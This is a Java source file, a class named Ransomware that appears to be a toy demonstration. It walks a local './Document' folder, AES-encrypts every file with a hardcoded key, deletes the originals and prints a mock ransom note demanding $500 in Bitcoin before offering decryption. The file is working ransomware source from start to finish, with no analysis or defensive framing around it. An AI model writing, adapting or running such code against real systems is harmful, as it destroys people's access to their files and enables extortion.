import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Scanner;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.SecretKey;
import javax.crypto.spec.SecretKeySpec;

public class Ransomware {

    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);

        // Check if files are encrypted or not
        if (areFilesEncrypted()) {
            // Files are encrypted, perform decryption
            System.out.println("Files are encrypted. Starting decryption...");
            System.out.print("Enter decryption key: ");
            String key = scanner.nextLine();
            decryptFiles(key);
        } else {
            // Files are not encrypted, perform encryption
            System.out.println("Files are not encrypted. Starting encryption...");
            encryptFiles();
        }
    }

    // Function to check if files are encrypted
    private static boolean areFilesEncrypted() {
        try {
            return Files.walk(Paths.get("./Document"))
                        .anyMatch(path -> path.toString().endsWith(".enc"));
        } catch (IOException e) {
            throw new RuntimeException("Error while walking through directory", e);
        }
    }

    // Function to encrypt files
private static void encryptFiles() {
    byte[] keyBytes = "thisisthesecretkeythatwillbeused".getBytes();
    SecretKey key = new SecretKeySpec(keyBytes, "AES");
    Cipher cipher;
    try {
        cipher = Cipher.getInstance("AES");
        cipher.init(Cipher.ENCRYPT_MODE, key);
    } catch (Exception e) {
        throw new RuntimeException("Error while setting up AES", e);
    }

    try {
        Files.walk(Paths.get("./Document"))
                .filter(Files::isRegularFile)
                .forEach(path -> {
                    try {
                        System.out.println("Encrypting " + path + "...");
                        byte[] original = Files.readAllBytes(path);
                        try {
                            byte[] encrypted = cipher.doFinal(original);
                            Path encryptedFilePath = Paths.get(path.toString() + ".enc");
                            Files.write(encryptedFilePath, encrypted);
                            Files.delete(path);
                        } catch (IllegalBlockSizeException | BadPaddingException ex) {
                            System.out.println("Error: Input data length or padding is invalid for AES encryption");
                            ex.printStackTrace();
                        }
                    } catch (IOException | RuntimeException e) {
                        System.out.println("Error while processing file: " + path);
                        e.printStackTrace();
                    }
                });
        // Prompt the user to pay ransom
        System.out.println("BuwHAHAHA! Your files have been encrypted. To get the decryption key, pay the ransom and also give a kiss.");
        System.out.println("Instructions for payment: Transfer $500 to Bitcoin address: XXXXXXXXXX");
        System.out.println("After payment, enter the decryption key to unlock your files. :P");
       
        // Prompt the user to enter the decryption key after encryption
        System.out.print("Encryption complete. Enter decryption key: ");
        Scanner scanner = new Scanner(System.in);
        String decryptionKey = scanner.nextLine();
        decryptFiles(decryptionKey); // Call decryption method with user-provided key
    } catch (IOException e) {
        throw new RuntimeException("Error while walking through directory", e);
    }
}



    // Function to decrypt files
    private static void decryptFiles(String key) {
        byte[] keyBytes = key.getBytes();
        SecretKey secretKey = new SecretKeySpec(keyBytes, "AES");
        Cipher cipher;
        try {
            cipher = Cipher.getInstance("AES");
            cipher.init(Cipher.DECRYPT_MODE, secretKey);
        } catch (Exception e) {
            throw new RuntimeException("Error while setting up AES", e);
        }

        try {
            Files.walk(Paths.get("./Document"))
                    .filter(Files::isRegularFile)
                    .forEach(path -> {
                        try {
                            if (path.toString().endsWith(".enc")) {
                                System.out.println("Decrypting " + path + "...");
                                byte[] encrypted = Files.readAllBytes(path);
                                byte[] decrypted = cipher.doFinal(encrypted);
                                Path decryptedFilePath = Paths.get(path.toString().replace(".enc", ""));
                                Files.write(decryptedFilePath, decrypted);
                                Files.delete(path);
                            }
                        } catch (IOException | RuntimeException e) {
                            System.out.println("Error while processing file: " + path);
                            e.printStackTrace();
                        } catch (Exception e) {
                            System.out.println("Decryption failed for file: " + path);
                            e.printStackTrace();
                        }
                    });
        } catch (IOException e) {
            throw new RuntimeException("Error while walking through directory", e);
        }
    }
}